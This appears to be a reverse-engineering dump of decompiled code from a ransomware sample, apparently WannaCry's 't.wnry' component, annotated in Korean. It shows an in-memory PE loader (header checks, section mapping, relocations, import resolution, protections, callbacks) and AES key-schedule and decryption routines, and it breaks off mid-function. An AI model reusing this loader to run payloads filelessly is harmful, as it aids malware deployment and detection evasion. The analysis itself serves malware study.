// Function Name: VirtualFree_402185
// Address: 0x402185
// Signature: unknown_signature
// ---------------
BOOL __cdecl VirtualFree_402185(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
{
  return VirtualFree(lpAddress, dwSize, dwFreeType);
}


// --- Metadata ---
// Function Name: LoadLibraryA_402198
// Address: 0x402198
// Signature: unknown_signature
// ---------------
HMODULE __stdcall LoadLibraryA_402198(LPCSTR lpLibFileName)
{
  return LoadLibraryA(lpLibFileName);
}


// --- Metadata ---
// Function Name: GetProcAddress__beep
// Address: 0x4021A3
// Signature: unknown_signature
// ---------------
void __cdecl GetProcAddress__beep(unsigned int Frequency, unsigned int Duration)
{
  GetProcAddress(Frequency, Duration);
}


// --- Metadata ---
// Function Name: FreeLibrary_4021B2
// Address: 0x4021B2
// Signature: unknown_signature
// ---------------
BOOL __cdecl FreeLibrary_4021B2(HMODULE hLibModule)
{
  return FreeLibrary(hLibModule);
}


// --- Metadata ---
// Function Name: LoadAndExecute_TwnryPayload_4021BD
// Address: 0x4021BD
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl LoadAndExecute_TwnryPayload_4021BD(void *decodedTwnryFile, int decodedTwnrySize)
{
  return Twnry_LoadAndRunInMemory_4021E9(       // Twnry라는 내부 페이로드 파일을 메모리에 로드하고 실행하기 위한 진입점 
           decodedTwnryFile,                    // 함수 포인터를 전달하는 방식은 흔히 reflective DLL injection, unpacking, shellcode execution에서 사용되며, 분석을 어렵게 만드는 기법
           decodedTwnrySize,
           VirtualAlloc_40216E,
           VirtualFree_402185,
           LoadLibraryA_402198,
           GetProcAddress__beep,
           FreeLibrary_4021B2,
           0);
}


// --- Metadata ---
// Function Name: Twnry_LoadAndRunInMemory_4021E9
// Address: 0x4021E9
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl Twnry_LoadAndRunInMemory_4021E9(void *decodedTwnryFile, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  char *PEheaderPointer; // edi
  int v9; // ebx
  int v10; // edx
  char *v11; // ecx
  int v12; // esi
  int v13; // eax
  unsigned int v14; // eax
  HMODULE v15; // eax
  void (__stdcall *v16)(char *); // eax
  int v17; // ecx
  int PEimageSize; // esi
  int v19; // ebx
  HANDLE v20; // eax
  unsigned int v21; // eax
  _DWORD *customMemoryStruct; // esi
  char *v23; // eax
  int v24; // eax
  int v25; // eax
  char v27[4]; // [esp+Ch] [ebp-28h] BYREF
  int v28; // [esp+10h] [ebp-24h]
  unsigned int maxImageSize; // [esp+30h] [ebp-4h]
  char *allocatedBase; // [esp+58h] [ebp+24h]

  maxImageSize = 0;
  if ( !checkBoundary_402457(a2, 0x40u) )       // 고급 로딩 기법, 디스크를 사용하지 않고 메모리 내에서 PE를 로딩, 복사, 실행
    return 0;
  if ( *decodedTwnryFile != 0x5A4D )            // MZ, PE헤더 확인 
    goto LABEL_3;
  if ( !checkBoundary_402457(a2, *(decodedTwnryFile + 15) + 248) )
    return 0;
  PEheaderPointer = decodedTwnryFile + *(decodedTwnryFile + 15);
  if ( *PEheaderPointer != 0x4550 )
    goto LABEL_3;
  if ( *(PEheaderPointer + 2) != 332 )
    goto LABEL_3;
  v9 = *(PEheaderPointer + 14);
  if ( (v9 & 1) != 0 )
    goto LABEL_3;
  v10 = *(PEheaderPointer + 3);
  if ( *(PEheaderPointer + 3) )
  {
    v11 = &PEheaderPointer[*(PEheaderPointer + 10) + 36];
    do
    {
      v12 = *(v11 + 1);
      v13 = *v11;
      if ( v12 )
        v14 = v12 + v13;
      else
        v14 = v9 + v13;
      if ( v14 > maxImageSize )
        maxImageSize = v14;
      v11 += 40;
      --v10;
    }
    while ( v10 );
  }
  v15 = GetModuleHandleA("kernel32.dll");
  if ( !v15 )
    return 0;
  v16 = (a6)(v15, "GetNativeSystemInfo", 0);
  if ( !v16 )
    return 0;
  v16(v27);
  v17 = ~(v28 - 1);
  PEimageSize = v17 & (*(PEheaderPointer + 20) + v28 - 1);
  if ( PEimageSize != (v17 & (v28 + maxImageSize - 1)) )
  {
LABEL_3:
    SetLastError(0xC1u);
    return 0;
  }
  v19 = (a3)(*(PEheaderPointer + 13), PEimageSize, 12288, 4, a8);
  if ( !v19 )
  {
    v19 = (a3)(0, PEimageSize, 12288, 4, a8);
    if ( !v19 )
    {
LABEL_24:
      SetLastError(0xEu);
      return 0;
    }
  }
  v20 = GetProcessHeap();
  v21 = HeapAlloc(v20, 8u, 0x3Cu);              // 구조체 할당 
  customMemoryStruct = v21;
  if ( !v21 )
  {
    (a4)(v19, 0, 0x8000, a8);
    goto LABEL_24;
  }
  *(v21 + 4) = v19;
  LOWORD(v21) = *(PEheaderPointer + 11);
  customMemoryStruct[5] = (v21 >> 13) & 1;
  customMemoryStruct[7] = a3;
  customMemoryStruct[8] = a4;
  customMemoryStruct[9] = a5;
  customMemoryStruct[10] = a6;
  customMemoryStruct[11] = a7;
  customMemoryStruct[12] = a8;
  customMemoryStruct[14] = v28;
  if ( !checkBoundary_402457(a2, *(PEheaderPointer + 21))// 재배치, Import 해결, 보호 속성 적용 
    || (allocatedBase = (a3)(v19, *(PEheaderPointer + 21), 4096, 4, a8),
        memcpy(allocatedBase, decodedTwnryFile, *(PEheaderPointer + 21)),
        v23 = &allocatedBase[*(decodedTwnryFile + 15)],
        *customMemoryStruct = v23,
        *(v23 + 13) = v19,
        !ResolveSectionsFromImage_402470(decodedTwnryFile, a2, PEheaderPointer, customMemoryStruct))
    || ((v24 = *(*customMemoryStruct + 52) - *(PEheaderPointer + 13)) == 0 ? (customMemoryStruct[6] = 1) : (customMemoryStruct[6] = AdjustImageRelocations_402758(customMemoryStruct, v24)),
        !ResolveAndBindFunctionPointers_4027DF(customMemoryStruct)
     || !ProtectMemorySections_40254B(customMemoryStruct)
     || !RunRegisteredCallbacks_40271D(customMemoryStruct)) )
  {
LABEL_37:
    CleanupCustomMemoryBlock_4029CC(customMemoryStruct);
    return 0;
  }
  v25 = *(*customMemoryStruct + 40);
  if ( v25 )
  {
    if ( customMemoryStruct[5] )
    {
      if ( !((v19 + v25))(v19, 1, 0) )
      {
        SetLastError(0x45Au);
        goto LABEL_37;
      }
      customMemoryStruct[4] = 1;
    }
    else
    {
      customMemoryStruct[13] = v19 + v25;
    }
  }
  else
  {
    customMemoryStruct[13] = 0;
  }
  return customMemoryStruct;
}


// --- Metadata ---
// Function Name: checkBoundary_402457
// Address: 0x402457
// Signature: unknown_signature
// ---------------
int __cdecl checkBoundary_402457(unsigned int a1, unsigned int a2)
{
  if ( a1 >= a2 )                               // a1 >= a2일 때 성공(1 반환) 
    return 1;
  SetLastError(13u);                            // ERROR_INVALID_DATA 오류 코드 
  return 0;
}


// --- Metadata ---
// Function Name: ResolveSectionsFromImage_402470
// Address: 0x402470
// Signature: unknown_signature
// ---------------
int __cdecl ResolveSectionsFromImage_402470(int a1, unsigned int a2, int a3, int a4)
{
  size_t *i; // esi
  signed int v6; // ebx
  void *v7; // ebx
  void *v9; // [esp-Ch] [ebp-1Ch]
  int v10; // [esp+Ch] [ebp-4h]
  int baseAddr; // [esp+24h] [ebp+14h] 복호화된 바이너리 로딩, 언패킹, 또는 수동 PE 로딩 

  v10 = 0;
  baseAddr = *(a4 + 4);
  if ( !*(*a4 + 6) )                            // 섹션/블록 개수 
    return 1;
  for ( i = (*(*a4 + 20) + *a4 + 40); !*i; i += 10 )// 섹션 배열 포인터 
  {
    v6 = *(a3 + 56);
    if ( v6 > 0 )
    {
      if ( !(*(a4 + 28))(*(i - 1) + baseAddr, v6, 4096, 4, *(a4 + 48)) )// 할당 콜백 함수와 추가 콘텍스트 
        return 0;
      v9 = (*(i - 1) + baseAddr);               // RVA 계산 
      *(i - 2) = v9;                            // 로드된 위치(포인터 캐시)
      memset(v9, 0, v6);
    }
LABEL_10:
    if ( ++v10 >= *(*a4 + 6) )
      return 1;
  }
  if ( checkBoundary_402457(a2, *i + i[1]) && (*(a4 + 28))(*(i - 1) + baseAddr, *i, 4096, 4, *(a4 + 48)) )
  {
    v7 = (*(i - 1) + baseAddr);
    memcpy(v7, (a1 + i[1]), *i);
    *(i - 2) = v7;
    goto LABEL_10;
  }
  return 0;
}


// --- Metadata ---
// Function Name: ProtectMemorySections_40254B
// Address: 0x40254B
// Signature: unknown_signature
// ---------------
BOOL __cdecl ProtectMemorySections_40254B(_DWORD *baseAddr)
{
  int v2; // esi
  int v3; // ecx
  unsigned int v4; // eax
  int v5; // esi
  int v6; // edi
  unsigned int v7; // edi
  int v8; // eax
  int v9; // ecx
  DWORD flOldProtect; // [esp+Ch] [ebp-1Ch] BYREF
  unsigned int v12; // [esp+10h] [ebp-18h]
  int v13; // [esp+14h] [ebp-14h]
  unsigned int v14; // [esp+18h] [ebp-10h]
  int v15; // [esp+1Ch] [ebp-Ch]
  int v16; // [esp+20h] [ebp-8h]
  DWORD v17; // [esp+24h] [ebp-4h]
  int baseAddra; // [esp+30h] [ebp+8h]

  v2 = *(*baseAddr + 20) + *baseAddr + 24;      // 첫번째 섹션 포인터 계산 
  v3 = *(*(*baseAddr + 20) + *baseAddr + 32) & ~(baseAddr[14] - 1);
  flOldProtect = *(*(*baseAddr + 20) + *baseAddr + 32);
  v12 = v3;
  v13 = GetHandler_40264F(baseAddr, v2);        // 보호 플래그 및 핸들러 추출 
  v4 = *(v2 + 36);
  v15 = 0;
  v14 = v4;
  v5 = v2 + 40;
  baseAddra = 1;
  if ( *(*baseAddr + 6) <= 1u )
  {
LABEL_12:
    v15 = 1;
    return ApplyMemoryProtection_40267B(baseAddr, &flOldProtect);// 메모리 보호를 섹션 단위로 적용 
  }
  while ( 1 )                                   //  PE 파일 로딩, 코드 압축 해제, 또는 런타임 복호화 같은 기능에서 사용 
  {
    v6 = baseAddr[14] - 1;
    v17 = *(v5 + 8);
    v7 = v17 & ~v6;
    v8 = GetHandler_40264F(baseAddr, v5);
    v16 = v8;
    if ( v12 == v7 || flOldProtect + v13 > v7 )
    {
      v9 = *(v5 + 36);
      if ( (v9 & 0x2000000) != 0 && (v14 & 0x2000000) != 0 )
        v14 |= v9;
      else
        v14 = (v14 | v9) & 0xFDFFFFFF;
      v13 = v17 + v8 - flOldProtect;
      goto LABEL_11;
    }
    if ( !ApplyMemoryProtection_40267B(baseAddr, &flOldProtect) )
      return 0;
    v12 = v7;
    flOldProtect = v17;
    v13 = v16;
    v14 = *(v5 + 36);
LABEL_11:
    ++baseAddra;
    v5 += 40;
    if ( baseAddra >= *(*baseAddr + 6) )        // 섹션 개수에 따라 반복 
      goto LABEL_12;
  }
}


// --- Metadata ---
// Function Name: GetHandler_40264F
// Address: 0x40264F
// Signature: unknown_signature
// ---------------
int __cdecl GetHandler_40264F(int a1, int a2)
{
  int result; // eax
  int v3; // ecx

  result = *(a2 + 16);                          // a2 + 16 값이 존재하면 핸들러로 반환 
  if ( !result )                                // 없으면 대체 핸들러 선택 
  {
    v3 = *(a2 + 36);
    if ( (v3 & 0x40) != 0 )
    {
      result = *(*a1 + 32);
    }
    else if ( (v3 & 0x80u) != 0 )
    {
      result = *(*a1 + 36);
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: ApplyMemoryProtection_40267B
// Address: 0x40267B
// Signature: unknown_signature
// ---------------
BOOL __cdecl ApplyMemoryProtection_40267B(int a1, DWORD flOldProtect)
{
  SIZE_T memorySize; // ebx
  BOOL result; // eax
  unsigned int v4; // ecx
  unsigned int v5; // esi
  DWORD v6; // edx

  memorySize = *(flOldProtect + 8);             // 조건적으로 메모리 보호 변경 또는 해제 
  if ( !memorySize )
    return 1;
  v4 = *(flOldProtect + 12);
  if ( (v4 & 0x2000000) != 0 )                  // 0x2000000 플래그가 있는 경우 
  {
    if ( *flOldProtect == *(flOldProtect + 4) )
    {
      if ( *(flOldProtect + 16) || (v5 = *(a1 + 56), *(*a1 + 56) == v5) || !(memorySize % v5) )
        (*(a1 + 32))(*flOldProtect, memorySize, 0x4000, *(a1 + 48));
    }
    result = 1;
  }
  else                                          // 조건 불만족 시 Virtual Protect 호출 
  {
    v6 = flNewProtect[4 * ((v4 >> 29) & 1) + 2 * ((v4 >> 30) & 1) + (v4 >> 31)];
    if ( (v4 & 0x4000000) != 0 )
      BYTE1(v6) |= 2u;
    result = VirtualProtect(*flOldProtect, memorySize, v6, &flOldProtect);
  }
  return result;
}


// --- Metadata ---
// Function Name: RunRegisteredCallbacks_40271D
// Address: 0x40271D
// Signature: unknown_signature
// ---------------
int __cdecl RunRegisteredCallbacks_40271D(_DWORD *a1)
{
  int baseAddr; // edi
  int offset; // eax
  void (__stdcall **v4)(_DWORD, int, _DWORD); // esi 콜백 함수 포인터 배열을 호출 

  baseAddr = a1[1];
  offset = *(*a1 + 192);
  if ( !offset )
    return 1;
  v4 = *(offset + baseAddr + 12);
  if ( v4 )
  {
    while ( *v4 )
      (*v4++)(baseAddr, 1, 0);
  }
  return 1;
}


// --- Metadata ---
// Function Name: AdjustImageRelocations_402758
// Address: 0x402758
// Signature: unknown_signature
// ---------------
BOOL __cdecl AdjustImageRelocations_402758(_DWORD *a1, int a2)
{
  int baseAddr; // esi
  _DWORD *relocationBlockBaseAddr; // eax
  int i; // ecx
  _WORD *v6; // edx
  int v7; // ebx
  unsigned int v8; // [esp+Ch] [ebp+8h] PE 파일 등의 로딩 시 베이스 주소 변경이 생길 경우 포인터를 수정하는 로직

  baseAddr = a1[1];
  if ( !*(*a1 + 164) )                          // 재배치 테이블 개수 혹은 존재 여부 
    return a2 == 0;
  relocationBlockBaseAddr = (baseAddr + *(*a1 + 160));
  for ( i = *relocationBlockBaseAddr; *relocationBlockBaseAddr; i = *relocationBlockBaseAddr )
  {
    v8 = 0;
    v6 = relocationBlockBaseAddr + 2;
    if ( ((relocationBlockBaseAddr[1] - 8) & 0xFFFFFFFE) != 0 )
    {
      do
      {
        v7 = *v6;
        LOWORD(v7) = v7 & 0xF000;
        if ( v7 == 12288 )
          *(i + baseAddr + (*v6 & 0xFFF)) += a2;
        ++v8;
        ++v6;
      }
      while ( v8 < (relocationBlockBaseAddr[1] - 8) >> 1 );
    }
    relocationBlockBaseAddr = (relocationBlockBaseAddr + relocationBlockBaseAddr[1]);
  }
  return 1;
}


// --- Metadata ---
// Function Name: ResolveAndBindFunctionPointers_4027DF
// Address: 0x4027DF
// Signature: unknown_signature
// ---------------
int __cdecl ResolveAndBindFunctionPointers_4027DF(_DWORD *a1)
{
  int v2; // edi
  _DWORD *v4; // ebx
  int v5; // eax
  _DWORD *v6; // eax
  int v7; // ecx
  int *v8; // eax
  int *v9; // edi
  int v10; // eax
  int v11; // eax
  int v12; // [esp+8h] [ebp-Ch]
  int v13; // [esp+Ch] [ebp-8h]
  int v14; // [esp+10h] [ebp-4h]
  int *v15; // [esp+1Ch] [ebp+8h]

  v2 = a1[1];
  v12 = v2;
  v13 = 1;
  if ( !*(*a1 + 132) )
    return 1;
  v4 = (v2 + *(*a1 + 128));
  if ( IsBadReadPtr(v4, 0x14u) )
    return v13;
  while ( 1 )                                   // relocation 엔트리 루프 
  {
    v5 = v4[3];
    if ( !v5 )
      return v13;
    v14 = (a1[9])(v2 + v5);
    if ( !v14 )
    {
      SetLastError(0x7Eu);
      return 0;
    }
    v6 = realloc(a1[2], 4 * a1[3] + 4);         // 문자열을 이용해 DLL 또는 API 이름으로 GetProcAddress류를 호출 
    if ( !v6 )
    {
      (a1[11])(v14, a1[12]);
      SetLastError(0xEu);
      return 0;
    }
    v7 = a1[3];
    a1[2] = v6;
    v6[v7] = v14;
    ++a1[3];
    if ( *v4 )                                  // relocation/patch 대상 처리 
    {
      v8 = (v2 + *v4);
      v9 = (v12 + v4[4]);
      v15 = v8;
    }
    else
    {
      v9 = (v4[4] + v2);
      v15 = v9;
    }
    while ( 1 )
    {
      v10 = *v15;
      if ( !*v15 )
        break;
      if ( v10 >= 0 )
        v11 = (a1[10])(v14, v12 + v10 + 2, a1[12]);
      else
        v11 = (a1[10])(v14, *v15, a1[12]);
      *v9 = v11;
      if ( !v11 )
      {
        v13 = 0;
        break;
      }
      ++v15;
      ++v9;
    }
    if ( !v13 )                                 // 실패 시 해제 및 에러 처리 
      break;
    v4 += 5;
    if ( IsBadReadPtr(v4, 0x14u) )
      return v13;
    v2 = v12;
  }
  (a1[11])(v14, a1[12]);
  SetLastError(0x7Fu);
  return v13;
}


// --- Metadata ---
// Function Name: lookupPEexportTable_402924
// Address: 0x402924
// Signature: unknown_signature
// ---------------
int __cdecl lookupPEexportTable_402924(int a1, char *String1)
{
  int baseAddr; // ecx
  _DWORD *exportDir; // esi
  unsigned int v4; // edx
  unsigned int ordinalIndex; // eax
  _DWORD *addrNamePtr; // edi
  unsigned __int16 *addrOrdinalName; // ebx
  int v9; // [esp+Ch] [ebp-4h]
  unsigned int v10; // [esp+18h] [ebp+8h]

  baseAddr = *(a1 + 4);                         // PE 내 Export Table을 수동 파싱하여 함수 주소를 찾음 
  v9 = baseAddr;
  if ( !*(*a1 + 124) )                          // 동적으로 API 주소를 찾는 데 사용 
    goto LABEL_12;
  exportDir = (baseAddr + *(*a1 + 120));
  if ( !exportDir[6] || !exportDir[5] )
    goto LABEL_12;
  if ( HIWORD(String1) )
  {
    addrNamePtr = (baseAddr + exportDir[8]);
    addrOrdinalName = (baseAddr + exportDir[9]);
    v10 = 0;
    while ( stricmp(String1, (baseAddr + *addrNamePtr)) )
    {
      ++v10;
      ++addrNamePtr;
      ++addrOrdinalName;
      if ( v10 >= exportDir[6] )
        goto LABEL_12;
      baseAddr = v9;
    }
    ordinalIndex = *addrOrdinalName;
    baseAddr = v9;
  }
  else
  {
    v4 = exportDir[4];
    if ( String1 < v4 )
    {
LABEL_12:
      SetLastError(0x7Fu);
      return 0;
    }
    ordinalIndex = String1 - v4;
  }
  if ( ordinalIndex > exportDir[5] )
    goto LABEL_12;
  return baseAddr + *(exportDir[7] + 4 * ordinalIndex + baseAddr);// RVA 
}


// --- Metadata ---
// Function Name: CleanupCustomMemoryBlock_4029CC
// Address: 0x4029CC
// Signature: unknown_signature
// ---------------
void __cdecl CleanupCustomMemoryBlock_4029CC(LPVOID lpMem)
{
  int i; // edi
  int v2; // eax
  int v3; // eax
  HANDLE v4; // eax

  if ( lpMem )                                  // 입력으로 받은 포인터(lpMem)가 가리키는 커스텀 구조체 내부 자원들을 해제 
  {
    if ( *(lpMem + 4) )
      ((*(lpMem + 1) + *(*lpMem + 40)))(*(lpMem + 1), 0, 0);
    if ( *(lpMem + 2) )
    {
      for ( i = 0; i < *(lpMem + 3); ++i )
      {
        v2 = *(*(lpMem + 2) + 4 * i);
        if ( v2 )
          (*(lpMem + 11))(v2, *(lpMem + 12));
      }
      free(*(lpMem + 2));
    }
    v3 = *(lpMem + 1);
    if ( v3 )
      (*(lpMem + 8))(v3, 0, 0x8000, *(lpMem + 12));
    v4 = GetProcessHeap();
    HeapFree(v4, 0, lpMem);
  }
}


// --- Metadata ---
// Function Name: RSAKey_structMember2_402A46
// Address: 0x402A46
// Signature: unknown_signature
// ---------------
_BYTE *__thiscall RSAKey_structMember2_402A46(_BYTE *this)
{
  _BYTE *result; // eax

  result = this;
  this[4] = 0;
  *this = &off_40BC7C;
  return result;
}


// --- Metadata ---
// Function Name: AESinitVtable_NDC_402A53
// Address: 0x402A53
// Signature: unknown_signature
// ---------------
void *__thiscall AESinitVtable_NDC_402A53(void *this, char a2)
{
  AESKeyStruct_initVtable_402A6F(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}


// --- Metadata ---
// Function Name: AESKeyStruct_initVtable_402A6F
// Address: 0x402A6F
// Signature: unknown_signature
// ---------------
void __thiscall AESKeyStruct_initVtable_402A6F(_DWORD *this)
{
  *this = &off_40BC7C;
}


// --- Metadata ---
// Function Name: AESKeySchedule_402A76
// Address: 0x402A76
// Signature: unknown_signature
// ---------------
size_t __thiscall AESKeySchedule_402A76(int this, int keyvalue, void *Src, int keylength, size_t Size)
{
  int v6; // ecx
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // edx
  bool v12; // sf
  char *v13; // ebx
  int v14; // edx
  char *v15; // ebx
  int v16; // eax
  unsigned __int8 *v17; // ecx
  int v18; // edi
  int v19; // edx
  int *v20; // eax
  int v21; // ebx
  _BYTE *v22; // ecx
  int *v23; // ecx
  int v24; // edx
  int v25; // eax
  int v26; // eax
  int v27; // edx
  _DWORD *v28; // eax
  int v29; // ecx
  _DWORD *v30; // eax
  int v31; // ecx
  _DWORD *v32; // eax
  int v33; // ecx
  int *v34; // ecx
  int v35; // edi
  int v36; // edx
  int v37; // eax
  int v38; // eax
  int v39; // edx
  size_t result; // eax
  bool v41; // cc
  int v42; // ecx
  _DWORD *v43; // edi
  void *v44; // [esp-8h] [ebp-28h]
  size_t v45; // [esp-4h] [ebp-24h]
  char pExceptionObject[12]; // [esp+Ch] [ebp-14h] BYREF
  int v47; // [esp+18h] [ebp-8h]
  int v48; // [esp+1Ch] [ebp-4h]
  int keyvalueb; // [esp+28h] [ebp+8h]
  int keyvaluec; // [esp+28h] [ebp+8h]
  int keyvalued; // [esp+28h] [ebp+8h]
  int keyvaluea; // [esp+28h] [ebp+8h]

  if ( !keyvalue )                              // AES 키 스케줄 또는 암호화 상태 초기화 작업
  {
    Src = &unk_40F57C;
    exception::exception(pExceptionObject, &Src);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  v6 = keylength;
  if ( keylength != 16 && keylength != 24 && keylength != 32 )
  {
    Src = &unk_40F57C;
    exception::exception(pExceptionObject, &Src);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  if ( Size != 16 && Size != 24 && Size != 32 )
  {
    Src = &unk_40F57C;
    exception::exception(pExceptionObject, &Src);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  v45 = Size;
  *(this + 972) = Size;
  v44 = Src;
  *(this + 968) = v6;
  memcpy((this + 976), v44, v45);               // 버퍼에 키 복사 
  memcpy((this + 1008), Src, *(this + 972));
  v7 = *(this + 968);
  if ( v7 == 16 )
  {
    v10 = *(this + 972);
    if ( v10 == 16 )
      v9 = 10;
    else
      v9 = v10 != 24 ? 14 : 12;
  }
  else
  {
    if ( v7 != 24 )
    {
      *(this + 1040) = 14;                      // 라운드 수 결정 
      goto InitRoundState;
    }
    v8 = (*(this + 972) == 32) - 1;
    LOBYTE(v8) = v8 & 0xFE;
    v9 = v8 + 14;
  }
  *(this + 1040) = v9;
InitRoundState:
  v11 = 0;
  v12 = *(this + 1040) < 0;
  keylength = *(this + 972) / 4;
  if ( !v12 )
  {
    v13 = (this + 8);
    do
    {
      if ( keylength > 0 )
        memset(v13, 0, 4 * keylength);
      ++v11;
      v13 += 32;
    }
    while ( v11 <= *(this + 1040) );
  }
  v14 = 0;
  if ( *(this + 1040) >= 0 )
  {
    v15 = (this + 488);
    do
    {
      if ( keylength > 0 )
        memset(v15, 0, 4 * keylength);
      ++v14;
      v15 += 32;
    }
    while ( v14 <= *(this + 1040) );
  }
  v16 = *(this + 968) / 4;
  v17 = keyvalue;
  v18 = keylength * (*(this + 1040) + 1);
  v47 = v18;
  v19 = v16;
  v20 = (this + 1044);
  v48 = v19;
  if ( v19 > 0 )
  {
    Src = v19;
    do
    {
      v21 = *v17 << 24;
      v22 = v17 + 1;
      *v20 = v21;
      *v20 |= *v22++ << 16;
      LOBYTE(v21) = 0;
      BYTE1(v21) = *v22;
      *v20 |= v21;
      *v20 |= *++v22;
      v17 = v22 + 1;
      ++v20;
      Src = Src - 1;
    }
    while ( Src );
  }
  Src = 0;
  if ( v19 <= 0 )
  {
BeginKeyExpansionLoop:
    if ( Src < v18 )
    {
      Size = &unk_40BBFC;
      while ( 1 )
      {
        keyvaluec = *(this + 4 * v19 + 1040);
        *(this + 1044) ^= byte_4089FC[HIBYTE(keyvaluec)] ^ ((byte_4089FC[keyvaluec] ^ ((byte_4089FC[BYTE1(keyvaluec)] ^ ((*Size++ ^ byte_4089FC[BYTE2(keyvaluec)]) << 8)) << 8)) << 8);
        if ( v19 == 8 )
        {
          v30 = (this + 1048);
          v31 = 3;
          do
          {
            *v30 ^= *(v30 - 1);
            ++v30;
            --v31;
          }
          while ( v31 );
          keyvalued = *(this + 1056);
          v32 = (this + 1064);
          *(this + 1060) ^= byte_4089FC[keyvalued] ^ ((byte_4089FC[BYTE1(keyvalued)] ^ ((byte_4089FC[BYTE2(keyvalued)] ^ (byte_4089FC[HIBYTE(keyvalued)] << 8)) << 8)) << 8);
          v33 = 3;
          do
          {
            *v32 ^= *(v32 - 1);
            ++v32;
            --v33;
          }
          while ( v33 );
        }
        else if ( v19 > 1 )
        {
          v28 = (this + 1048);
          v29 = v19 - 1;
          do
          {
            *v28 ^= *(v28 - 1);
            ++v28;
            --v29;
          }
          while ( v29 );
        }
        keyvaluea = 0;
        if ( v19 > 0 )
          break;
FinishRoundKeyAssignment:
        if ( Src >= v18 )
          goto FinalizeKeySchedule;
      }
      v34 = (this + 1044);
      while ( Src < v18 )
      {
        v35 = Src / keylength;
        v36 = Src % keylength;
        *(this + 4 * (Src % keylength + 8 * (Src / keylength)) + 8) = *v34;
        v37 = *(this + 1040) - v35;
        ++keyvaluea;
        v18 = v47;
        v38 = v36 + 8 * v37;
        v39 = *v34++;
        Src = Src + 1;
        *(this + 4 * v38 + 488) = v39;
        v19 = v48;
        if ( keyvaluea >= v48 )
          goto FinishRoundKeyAssignment;
      }
    }
  }
  else
  {
    v23 = (this + 1044);
    while ( Src < v18 )
    {
      keyvalueb = Src / keylength;
      v24 = Src % keylength;
      *(this + 4 * (Src % keylength + 8 * (Src / keylength)) + 8) = *v23;
      v25 = *(this + 1040) - keyvalueb;
      Src = Src + 1;
      v26 = v24 + 8 * v25;
      v27 = *v23++;
      *(this + 4 * v26 + 488) = v27;
      v19 = v48;
      if ( Src >= v48 )
        goto BeginKeyExpansionLoop;
    }
  }
FinalizeKeySchedule:
  result = 1;
  v41 = *(this + 1040) <= 1;
  Size = 1;
  if ( !v41 )
  {
    Src = (this + 520);
    do
    {
      v42 = keylength;
      if ( keylength > 0 )
      {
        v43 = Src;
        do
        {
          *v43 = dword_40B7FC[*v43] ^ dword_40B3FC[BYTE1(*v43)] ^ dword_40AFFC[BYTE2(*v43)] ^ dword_40ABFC[HIBYTE(*v43)];
          ++v43;
          --v42;
        }
        while ( v42 );
      }
      ++Size;
      Src = Src + 32;
      result = Size;
    }
    while ( Size < *(this + 1040) );
  }
  *(this + 4) = 1;                              // 초기화 완료 플래그 
  return result;
}


// --- Metadata ---
// Function Name: decryptAES_402E7E
// Address: 0x402E7E
// Signature: unknown_signature
// ---------------
_BYTE *__thiscall decryptAES_402E7E(_BYTE *this, unsigned __int8 *a2, _BYTE *a3)
{
  _DWORD *v3; // edi
  unsigned __int16 v4; // bx
  unsigned __int16 v5; // cx
  int v6; // edx
  int v7; // ecx
  int v8; // esi
  int v9; // esi
  int v10; // esi
  int v11; // ecx
  int v12; // ecx
  int v13; // ebx
  int v14; // esi
  int v15; // esi
  int v16; // eax
  int v17; // edi
  int v18; // eax
  _DWORD *v19; // edx
  int v20; // eax
  int v21; // edx
  int v22; // ecx
  int v23; // eax
  int v24; // edx
  int v25; // edx
  int v26; // edx
  bool v27; // zf
  int v28; // eax
  int v29; // edx
  _DWORD *v30; // edi
  _BYTE *result; // eax
  int v32; // ebx
  int v33; // edx
  int v34; // ebx
  int v35; // edx
  int v36; // edi
  char pExceptionObject[12]; // [esp+4h] [ebp-28h] BYREF
  _BYTE *v38; // [esp+10h] [ebp-1Ch]
  int v39; // [esp+14h] [ebp-18h]
  int v40; // [esp+18h] [ebp-14h]
  int v41; // [esp+1Ch] [ebp-10h]
  int v42; // [esp+20h] [ebp-Ch]
  int v43; // [esp+24h] [ebp-8h]
  int v44; // [esp+28h] [ebp-4h]
  _DWORD *v45; // [esp+34h] [ebp+8h]

  v3 = this;
  v38 = this;
  if ( !this[4] )
  {
    exception::exception(pExceptionObject, &off_40F570);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  LOBYTE(v4) = 0;
  LOBYTE(v5) = 0;
  HIBYTE(v5) = a2[2];
  v6 = v3[2] ^ (a2[3] | v5 | (a2[1] << 16) | (*a2 << 24));
  v7 = a2[5];
  v8 = a2[4] << 24;
  v41 = v6;
  v9 = (v7 << 16) | v8;
  LOBYTE(v7) = 0;
  BYTE1(v7) = a2[6];
  v10 = v3[3] ^ (a2[7] | v7 | v9);
  v11 = a2[8] << 24;
  v42 = v10;
  HIBYTE(v4) = a2[10];
  v12 = v3[4] ^ (a2[11] | v4 | (a2[9] << 16) | v11);
  v13 = a2[13];
  v14 = a2[12] << 24;
  v40 = v12;
  v15 = (v13 << 16) | v14;
  BYTE1(v13) = a2[14];
  LOBYTE(v13) = a2[15];
  v16 = v3[260];
  v39 = v16;
  v43 = v3[5] ^ (v15 | v13);
  if ( v16 > 1 )
  {
    v45 = v3 + 12;
    v44 = v16 - 1;
    do
    {
      v17 = *(v45 - 1) ^ dword_4097FC[v6] ^ dword_408BFC[HIBYTE(v42)] ^ dword_408FFC[BYTE2(v40)] ^ dword_4093FC[BYTE1(v43)];
      v18 = dword_4097FC[v42] ^ dword_4093FC[BYTE1(v6)] ^ dword_408BFC[HIBYTE(v40)] ^ dword_408FFC[BYTE2(v43)];
      v19 = v45;
      v45 += 8;
      v40 = *v19 ^ v18;
      v20 = dword_4097FC[v12] ^ dword_408FFC[BYTE2(v41)] ^ dword_4093FC[BYTE1(v42)] ^ dword_408BFC[HIBYTE(v43)];
      v21 = BYTE1(v12);
      v22 = BYTE2(v42);
      v23 = *(v45 - 7) ^ v20;
      v24 = dword_4093FC[v21];
      v42 = v17;
